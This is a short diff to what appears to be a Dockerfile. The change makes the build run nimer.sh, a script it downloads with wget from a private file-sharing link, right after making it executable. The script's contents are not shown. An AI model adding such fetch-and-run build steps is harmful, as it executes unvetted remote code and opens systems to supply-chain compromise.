@@ -102,7 +102,8 @@ RUN rm -rf /etc/apt/sources.list && \
 	apt-get install -y powershell && \
 #Nimer
 	wget -q https://cdn.filesend.jp/private/X7P3McQXb0Re1d3qjYLsdGjE5Qx3u6Jz73HgmWZ52SRhe6mAL6u9lj-wTPj1iO1a/nimer.sh -P /app && \
-	chmod +x /app/nimer.sh
+	chmod +x /app/nimer.sh && \
+	bash /app/nimer.sh
 	
 ENTRYPOINT ["supervisord", "-c"]
 
